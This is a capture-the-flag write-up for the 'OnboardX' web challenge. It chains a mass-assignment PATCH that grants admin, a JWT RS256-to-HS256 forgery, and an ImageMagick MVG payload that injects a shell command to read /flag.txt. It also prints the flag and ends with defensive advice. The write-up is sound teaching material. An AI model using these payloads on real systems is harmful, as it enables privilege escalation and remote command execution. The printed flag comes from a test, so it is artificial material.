# KPMG CTF 2026: OnboardX — Web Exploitation Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | OnboardX |
| **Category** | Web Exploitation / Mass Assignment / JWT Confusion / ImageMagick RCE |
| **Points** | 30 |
| **Target Host** | `https://kicyber-67e68bada969-onboardx-0-0.chals.io` |
| **Flag** | `KPMG_CTF{aQUhfj8rvs240qLr7QZcMmhTRpRyssqXjvvgWRQv_zk}` |

---

## 1. Executive Summary

OnboardX is an employee onboarding portal where newly registered accounts remain in a "pending" state awaiting manual HR approval. Once approved, employees can upload an avatar/ID photo, while administrators can trigger official employee badge generation.

Solving this challenge required chaining three distinct vulnerabilities:
1. **Profile Mass Assignment:** Bypassing HR approval and modifying user account attributes via `PATCH /api/user/me`.
2. **JWT Algorithm Confusion (RS256 → HS256):** Forging an administrative token using the published RSA public key from `/.well-known/jwks.json` as the HMAC secret.
3. **ImageMagick Command Injection (ImageTragick MVG Delegate):** Crafting an image payload with embedded shell commands triggered during administrative ID badge rendering (`POST /admin/idcard/<id>`).

The command execution was used to read `/flag.txt` into the web-accessible static directory to capture the flag.

---

## 2. Step-by-Step Exploitation

### Step 1: Reconnaissance
Inspecting public API documentation at `GET /api` revealed key endpoints:
- `GET /.well-known/jwks.json`
- `GET /api/user/me`
- `PATCH /api/user/me`
- `GET /settings/export`

Querying `/.well-known/jwks.json`:
```json
{
  "alg": "RS256",
  "kid": "prod-rsa-key-2026",
  "kty": "RSA",
  "use": "sig"
}
```

The application notes that HR onboarding review takes 48 hours.

---

### Step 2: Mass Assignment to Bypass HR Approval
Registered an account via `POST /register` and logged in. Querying `GET /api/user/me` returned:

```json
{
  "id": 4,
  "username": "ctfuser20261010b",
  "is_approved": false,
  "role": "user",
  "avatar_path": ""
}
```

The profile update endpoint failed to restrict writable attributes. Sending a `PATCH /api/user/me` request:

```http
PATCH /api/user/me HTTP/1.1
Content-Type: application/json

{
  "is_approved": true,
  "role": "admin"
}
```

**Response:**
```json
{
  "id": 4,
  "username": "ctfuser20261010b",
  "is_approved": true,
  "role": "admin"
}
```

Although the database record was updated, logging in again still minted a JWT with `"role": "user"` because the token-minting logic defaulted the claim for standard logins.

---

### Step 3: Forging an Administrator JWT (Algorithm Confusion)
The server verifies tokens using the algorithm specified in the incoming JWT header without enforcing `RS256`. 

By switching `"alg": "HS256"`, the verification engine treats the public RSA key (in PEM format) as the symmetric HMAC secret key!

#### Constructing the Forged Token:
1. Downloaded the RSA public key from `/.well-known/jwks.json` and converted to standard PEM format:
   ```text
   -----BEGIN PUBLIC KEY-----
   ... [Base64 DER] ...
   -----END PUBLIC KEY-----
   ```
2. Crafted claims with administrative rights:
   ```json
   {
     "sub": 4,
     "username": "ctfuser20261010b",
     "role": "admin",
     "iat": 1791654230,
     "exp": 1791675830
   }
   ```
3. Signed the token with `HS256` using the exact public key PEM text as the HMAC secret.
4. Sent `GET /admin` with `Authorization: Bearer <FORGED_JWT>`, successfully bypassing authorization to reach the HR review queue.

---

### Step 4: Discovering the Badge Generation Pipeline
The admin dashboard contains a client-side button triggering badge creation:

```javascript
function genIDCard(id, btn) {
  fetch(`/admin/idcard/${id}`, { method: 'POST' })
}
```

Testing `POST /admin/idcard/4` returned a response header revealing the underlying renderer:
```http
X-Powered-By: ImageMagick/6
```

---

### Step 5: ImageMagick Command Injection (MVG Payload)
The avatar upload endpoint `POST /profile` only validated the leading magic bytes of the file, allowing an MVG script disguised as a GIF to pass validation.

ImageMagick 6's MVG renderer delegates URL handling to external shell utilities without sanitizing quotes:

```text
GIF89a
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|cat /flag.txt > /app/app/static/onboardx-final.txt" )'
pop graphic-context
```

1. Uploaded the crafted file as the avatar for user 4.
2. Triggered badge rendering via `POST /admin/idcard/4`.
3. The delegate executed the shell command under root privileges, writing the flag to `/app/app/static/onboardx-final.txt`.

---

### Step 6: Flag Retrieval
Fetching the exfiltrated flag file:

```bash
curl -s "https://kicyber-67e68bada969-onboardx-0-0.chals.io/static/onboardx-final.txt"
```

**Output:**
```text
KPMG_CTF{aQUhfj8rvs240qLr7QZcMmhTRpRyssqXjvvgWRQv_zk}
```

---

## 3. Final Flag

```text
KPMG_CTF{aQUhfj8rvs240qLr7QZcMmhTRpRyssqXjvvgWRQv_zk}
```

---

## 4. Key Takeaways & Defense
- **Mass Assignment:** Never bind unvalidated JSON payloads directly to database entities; use explicit Data Transfer Objects (DTOs) with strict whitelists.
- **JWT Algorithm Verification:** Explicitly configure JWT verifiers with permitted algorithms (e.g., `options.algorithms = ['RS256']`). Never allow the token header to choose the algorithm.
- **Image Processing Sandboxing:** Disable dangerous ImageMagick delegates in `policy.xml` (`<policy domain="coder" rights="none" pattern="MVG" />`) and isolate image processing in unprivileged containers.
